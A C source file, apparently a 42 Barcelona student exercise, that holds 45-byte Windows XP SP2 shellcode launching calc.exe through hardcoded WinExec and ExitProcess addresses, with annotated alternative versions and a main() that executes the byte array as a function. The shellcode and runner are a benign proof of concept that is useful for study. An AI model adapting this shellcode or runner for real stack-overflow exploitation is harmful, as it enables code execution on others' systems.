/* ************************************************************************** */
/*                                                                            */
/*                                                        :::      ::::::::   */
/*   tsunami.c                                          :+:      :+:    :+:   */
/*                                                    +:+ +:+         +:+     */
/*   By: msoler-e <msoler-e@student.42barcel>       +#+  +:+       +#+        */
/*                                                +#+#+#+#+#+   +#+           */
/*   Created: 2022/08/09 11:26:01 by msoler-e          #+#    #+#             */
/*   Updated: 2022/08/12 11:57:47 by msoler-e         ###   ########.fr       */
/*                                                                            */
/* ************************************************************************** */

/*
win32/xp sp2 calc.exe 45 bytes
Author : Mountassif Moad
Big Thnx : To my brother iuoisn & His0ka & Jadi ...... Mr.Safa7
Changed by : Stack
First shellcode : http://www.milw0rm.com/exploits/7971
Description : It is 45 Bytes Shellcode which Execute calc.exe Tested Under Windows Xp SP2
for exploited a stack overflow have a small space to put our shellcode xd :d  just for fun :d
//llocm memoria winexec = 0x000623AD
*/
#include <stdio.h>
#include <string.h>
unsigned char shellcode[] ="\xeb\x0e\xba\xad\x23\x86\x7c\xff\xd2\xba\xfa\xca\x81\x7c\xff\xd2\xe8\xed\xff\xff\xff\x63\x61\x6c\x63\x00";
/*
"\x31\xc0\x50\x68\x63"
"\x61\x6c\x63\x89\xe3"
"\x50\x53\xbb"
"\xfd\xAD\x23\x86\x7c" Kernel32.dll.WinExec
"\xff\xd3\x50\xbb"
"\xfa\xca\x81\x7c" Kernel32.dll.ExitProcess
"\xff\xd3";
*/
/*
"\xEB\x10" //jmp short 0x12
"\x5B" //pop ebx
"\x53" //push ebx
"\xBB\xAD\x23\x86\x7C" //mov ebx, 0x7c8623ad
"\xFF\xD3" //call ebx
"\xBB\xFA\xCA\x81\x7C" //mov ebx, 0x7c81cafa
"\xFF\xD3" //call ebx
"\xE8\xEB\xFF\xFF\xFF" //call dword 0x2
//db calc.exe
"\x63\x61\x6C\x63\x2E\x65\x78\x65";
*/
int main ()
{
	int (*func)();
	func = (int (*)()) shellcode;
	(int)(*func)();
}
